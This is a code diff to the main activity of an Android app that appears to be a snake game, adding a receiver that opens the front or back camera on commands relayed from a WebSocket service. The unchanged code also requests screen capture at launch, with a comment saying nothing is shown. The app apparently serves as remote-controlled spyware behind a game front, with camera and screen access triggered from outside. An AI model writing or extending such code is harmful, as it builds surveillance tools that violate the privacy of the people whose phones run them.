@@ -1,7 +1,10 @@
 package com.kriptoman;
 
 import android.Manifest;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -16,6 +19,7 @@ import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -33,6 +37,7 @@ public class MainActivity extends AppCompatActivity {
     private static MediaProjection sMediaProjection;
     private SnakeGameView gameView;
     private boolean isFrontCamera = false;
+    private BroadcastReceiver cameraReceiver;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -45,15 +50,33 @@ public class MainActivity extends AppCompatActivity {
         if (sMediaProjection == null) {
             startActivityForResult(mpManager.createScreenCaptureIntent(), SCREEN_CAPTURE);
         }
+
+        // Регистрируем ресивер для команд камеры
+        cameraReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                String action = intent.getAction();
+                if (WebSocketService.ACTION_CAMERA_FRONT.equals(action)) {
+                    isFrontCamera = true;
+                    launchCamera(CAMERA_REQUEST_FRONT);
+                } else if (WebSocketService.ACTION_CAMERA_BACK.equals(action)) {
+                    isFrontCamera = false;
+                    launchCamera(CAMERA_REQUEST_BACK);
+                }
+            }
+        };
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(WebSocketService.ACTION_CAMERA_FRONT);
+        filter.addAction(WebSocketService.ACTION_CAMERA_BACK);
+        registerReceiver(cameraReceiver, filter);
     }
 
-    private void startService() {
-        Intent intent = new Intent(this, WebSocketService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent);
-        } else {
-            startService(intent);
+    private void launchCamera(int requestCode) {
+        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        if (isFrontCamera) {
+            intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
         }
+        startActivityForResult(intent, requestCode);
     }
 
     @Override
@@ -75,6 +98,15 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 Toast.makeText(this, "Съёмка отменена", Toast.LENGTH_SHORT).show();
             }
+        }
+    }
+
+    private void startService() {
+        Intent intent = new Intent(this, WebSocketService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
         }
     }
 
@@ -106,14 +138,11 @@ public class MainActivity extends AppCompatActivity {
         // ничего не показываем
     }
 
-    // Статический метод для запуска камеры из сервиса (по команде)
-    public static void launchCamera(boolean front) {
-        // Этот метод вызывается из сервиса, но мы будем запускать Intent из Activity, поэтому передадим контекст
-        // В сервисе мы запускаем Intent напрямую, но результат не обработается.
-        // Поэтому мы будем использовать другой подход: в сервисе при команде камеры отправляем широковещательное сообщение
-        // или используем PendingIntent. Проще всего: сервис просто запускает Intent с флагом NEW_TASK,
-        // но результат не получить. Поэтому мы изменим подход: в сервисе при команде камеры мы будем отправлять
-        // широковещательное сообщение, которое перехватит MainActivity и запустит камеру с результатом.
-        // Для простоты я реализую через BroadcastReceiver.
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (cameraReceiver != null) {
+            unregisterReceiver(cameraReceiver);
+        }
     }
 }
